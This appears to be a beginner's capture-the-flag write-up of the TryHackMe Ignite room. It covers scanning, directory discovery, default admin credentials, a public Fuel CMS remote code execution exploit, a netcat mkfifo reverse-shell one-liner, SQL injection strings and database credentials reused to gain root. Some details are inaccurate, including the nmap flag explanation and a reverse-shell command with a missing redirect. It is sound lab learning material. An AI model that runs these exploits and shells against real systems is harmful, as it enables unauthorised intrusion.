# TryHackMe Ignite - CTF writeup

## Challenge Information
-Platform: TryHackMe
-Room: Ignite
-Category: Beginner-friendly penetration testing
-Difficulty: Easy
-Focus: Web enumeration, exploitation and privilege escalation
-Status: Completed

## Objective
The objective was to investigate the target machine, identify potential vulnerabilities, gain user and root access, and complete the challenge.

## Methodology
1. Peformed reconnaissance against the target.
2. Identified open ports and running services.
3. Investigated the available web application.
4. Identified a potential vulnerability.
5. Tested the vulnerability within the CTF evironment.
6. Worked toward obtaining the required access.
7. Documented the findings and lessons learned.

## 1. Reconnaissance

## Objective
Indentify open ports and discover the services running on the target machine.

### Command
'''bash : nmap -sV -F -T4 <TARGET_IP> '''

### Explanation
- '-sV' : Attempts to identify running service verions.
- '-F' : For faster scan.
- '-T4' : For aggrasive and deep scan.
- '<TARGET_IP>' : The authorized CTF target's IP address.

### Findings
- port          state           service
- 80/tcp        open            http Apache httpd 2.4.8((Ubuntu))

### Analysis
The http web service is running on target's machine.
We can use this vulnerability for further investigation.


## 2. Vulnerability Identification

### Observatin

As we can see the http website's version is Apache httpd 2.4.8 .

### Evidence

We can research on google or other sources for information about that exact service.
One of the best and popular sources is ''Rapid7.com''.

### Conclusion

From the information online, we can see the service is an older release in the 2.4.x branch that has known security vulnerabilities and is long past is recommmended lifecycle.
This information is essential for our next exploitation process.


## 3. Exploitation

### Objective

We gonna find if the website has hidden directories or pages or other hidden information.

### Steps

I am using 'Gobuster' here. I gonna run the command below and wait for it to finish.
'''bash : gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt '''.

After the gobuster is finished.
We can see the hidden directories like '' /0 , /assets , /home , /index , /index.php , /offline and /robots.txt ''.
We can search by adding these directories at the end of the url to find for clues.
Example - ''http://<TARGET_IP>/robots.txt

We gonna search every directories to find the information about the flag.

### Result

HEYYY!! LOOK , we found something in /robots.txt .

-> User-agent: *
-> Disallow: /fuel/

We found a hidden disallowed directory , go to there by searching , ''http://<TARGET_IP>/fuel/'' .
We found the login page.
We gonna try SQL injection, by adding these in username inbox and password inbox ,
< Username' OR '1=TRUE > and < password' OR '1=TRUE >
It didn't work. so we gonna simply adding admin in both box.
If you are not familiar with CTFs, admin and password are default username and password for most intentionally vulnerable program.

Heyyy , It worked. Let's check its source code, nothing phishy found.

### Security Imapact
Attackers can exploit and explore the hidden or sensitive directories if the developer left that the addresses to there in visible openfield or in unsecure places.


## 4. Privilege Escalation

### Initial access

I used 'Searchsploit' to find the exploit entries for the exact version of the  website and service running on it.
We can see the service at the original website page. It says CMS 1.4.

''' bash : searchsploit cms 1.4 '''

We can see a number of enntires, but we will use 'fuel cms 1.4.1 - Remote code Execution(3) | php/webapps/50477.py' , since it is the latest version of entries of our website.

'''bash : searchsploit -m php/webapps/50477.py '''

We gonna look for and use the python script we installed from searchsploit.

'''bash : ls '''
'''bash : python3 50477.py '''

Ohh it says the instruction to use. Execute python script according to that format.

'''bash : python3 50477.py -u http://<TARGET_IP>/fuel '''

BOOOM!!! SHELL!! we got a shell.
check the privilege .

'''bash : whoami '''


### User Access


For advanced shell control and more privilege access, we gonna use netcat for reverse shell.

''' bash : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1| nc <YOUR_IP> <PORT> /tmp/f '''

Open new terminal and type this for netcat listener.

'''bash : nc -lnvp <PORT> '''

BOOM!! REVERSE SHELL !!!
Now we gonna look for the flag.

'''bash : cd ../../../../ '''

'''bash : cd /home '''


#### User flag


OHH we found the flag.

''' bash : cat flag.txt ''''

### Root Access


Then we gonna go to root directory for rootflag.

''' bash : cd ../../../../../../ '''
''' bash : cd /root '''

OH root needs permission . We gonna need to find username and password for root access.
Find the permission key.

'''bash : find / -perm -u=s 2>/dev/null '''

We found nothing , now we gonna go to original directory to find for root key.


''' bash : cd /var/www/html/ '''

We gonna need to check every directories from the original website.
Usually the usernames, passwords and other information are stored in database, so we gonna check the databases.


I found database.php in fuel/application/config directory .
I gonna read the php script .

'''bash : cat database.php '''

HOORAYYY !!! we found username and password for root.


#### Root Flag

We gonna use that username and password.

'''bash : su root '''

OH It says root must be run from termial .
So we gonna use TTY Spawn Shell python script .
You can search that script from google or other sources easily.

''' bash : python3 -c 'import pty; pty .spawn("/bin/bash")' '''

Yayy!!! we got terminal for root , now use root key.

''' bash : su root '''

Then add password .
BOOM!! we got root access. now go to the root directory and find root flag.
If you found root flag, open it.

''' bash : cat root.txt '''

BOom!!! we got root flag.


###### WE COMPLETED A ROOM !!!

## Lessons Learned

- Improved my understanding of service enumeration.
- Learned to investigate discovered services instead of relying port numbers alone.
- Practiced documenting commands and their outputs.
- Learned the importance of verifying findings before drawing conclusions.
- Recognized the importance of patching vulnerable software and removing insecure configurations.

## What I Would Improve

In future challenges, I will record important outputs and capture screenshots during each stages.

I will also document why I choose a particular technique instead of recording commands alone.

## Conclusion

This challenge helped me practice the penetration-testing workflow, from initial reconnaissance to verifying the results.

It also improved my ability to document technical findings and identify areas for further study.

## References

- TryHackMe  Ignite room
- Official documentation for the tools used
- Relevant vulnerability advisories . If applicable.
